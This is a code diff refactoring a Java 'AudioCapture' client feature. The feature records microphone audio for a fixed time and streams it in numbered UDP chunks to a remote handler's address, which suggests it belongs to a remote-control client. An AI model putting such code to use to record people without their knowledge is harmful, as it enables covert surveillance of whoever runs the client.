@@ -1,6 +1,5 @@
 package Client.Features;
 
-import Handler.Message;
 import Handler.PacketHandler;
 import Tools.Network.NetworkInterface;
 
@@ -54,22 +53,19 @@ public class AudioCapture extends Feature {
                 line.open(format);
                 line.start();
                 if (line.getFormat().matches(format)) {
-                    LocalTime time = LocalTime.now();
-                    LocalTime targetTime = time.plusSeconds(RECORD_TIME / 1000);
+                    LocalTime targetTime = LocalTime.now().plusSeconds(RECORD_TIME / 1000);
                     do {
                         int bytesRead = line.read(data, 0, data.length);
                         bos.write(data, 0, bytesRead);
-                        line.flush();
                     } while (LocalTime.now().getSecond() != targetTime.getSecond());
                     line.close();
                     bos.close();
-                    byte[] refByte = bos.toByteArray();
-                    byte[][] spliced = objectHandler.spliceArray(refByte, 5);
-                    for (byte[] bytes : spliced) {
-                        Message<byte[]> msg = () -> bytes;
-                        byte[] dataMsg = objectHandler.writeModifiedArray(objectHandler.writeObjects(msg), NetworkInterface.CommandByte.AUDIOCAPTURE_BYTE);
+                    byte[][] spliced = objectHandler.spliceArray(bos.toByteArray());
+                    for (int i = 0; i < spliced.length; i++) {
+                        byte[] bytes = spliced[i];
+                        byte[] dataMsg = objectHandler.writeModifiedArray(objectHandler.writeObjects(() -> bytes), NetworkInterface.CommandByte.AUDIOCAPTURE_BYTE, (byte) (i+1));
                         packetHandler.send(dataMsg, dataMsg.length, packetHandler.getAddress(), packetHandler.getPort());
-                        Sleep(500);
+                        Sleep(1000/60);
                     }
                     packetHandler.send(new byte[]{NetworkInterface.CommandByte.AUDIOCAPTURE_INFO_STOP}, 1, packetHandler.getAddress(), packetHandler.getPort());
                 }
